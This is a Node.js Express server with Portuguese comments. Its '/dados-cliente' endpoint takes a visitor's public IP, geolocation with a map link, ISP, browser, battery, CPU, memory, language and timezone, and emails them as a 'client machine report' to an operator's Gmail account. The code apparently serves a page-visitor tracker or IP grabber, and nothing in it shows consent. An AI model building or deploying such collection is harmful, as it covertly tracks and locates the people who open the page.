require('dotenv').config();
const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Página inicial
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Recebe dados do cliente e envia por e-mail
app.post('/dados-cliente', async (req, res) => {
    try {
        const dados = req.body;

        // Formatar localização
        const localizacao = dados.ipInfo.latitude !== 'Indisponível' 
            ? `https://www.google.com/maps?q=${dados.ipInfo.latitude},${dados.ipInfo.longitude}`
            : 'Indisponível';

        const corpoEmail = `
📌 DADOS DA MÁQUINA DO CLIENTE

🌐 INFORMAÇÕES DE REDE:
🌍 IP Público: ${dados.ipInfo.ip || 'N/D'}
🏳️ País: ${dados.ipInfo.pais || 'N/D'}
🏙️ Região: ${dados.ipInfo.regiao || 'N/D'}
🏢 Cidade: ${dados.ipInfo.cidade || 'N/D'}
📮 CEP: ${dados.ipInfo.cep || 'N/D'}
📍 Localização: ${localizacao}
📡 Provedor: ${dados.ipInfo.provedor || 'N/D'}
📶 Tipo de Conexão: ${dados.conexao || 'N/D'}

💻 INFORMAÇÕES DO DISPOSITIVO:
🧭 Navegador: ${dados.navegador || 'N/D'}
💻 Plataforma: ${dados.plataforma || 'N/D'}
🖥️ Resolução da Tela: ${dados.resolucao || 'N/D'}
🔋 Nível de Bateria: ${dados.bateria || 'N/D'}
🧠 Memória: ${dados.memoriaDisponivel || 'N/D'}
⚙️ Núcleos CPU: ${dados.coresCPU || 'N/D'}
🖱️ Touchscreen: ${dados.touchscreen || 'N/D'}
🍪 Cookies habilitados: ${dados.cookiesHabilitados || 'N/D'}

🗣️ CONFIGURAÇÕES:
🗣️ Idioma: ${dados.idioma || 'N/D'}
⏰ Fuso Horário: ${dados.timezone || 'N/D'}
📅 Data e Hora: ${new Date(dados.dataHora).toLocaleString() || 'N/D'}

🔗 MAPA: ${localizacao}
`.trim();

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS,
            },
        });

        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: '📬 Relatório Completo da Máquina do Cliente',
            text: corpoEmail,
            html: corpoEmail.replace(/\n/g, '<br>').replace(/📌|🌐|💻|🗣️|🔗/g, '<strong>$&</strong>')
        });

        console.log('✅ Dados enviados por e-mail.');
        res.send('Dados enviados com sucesso!');
    } catch (err) {
        console.error('❌ Erro ao enviar dados:', err);
        res.status(500).send('Erro ao enviar os dados.');
    }
});

app.listen(port, () => {
    console.log(`🚀 Servidor rodando em http://localhost:${port}`);
});
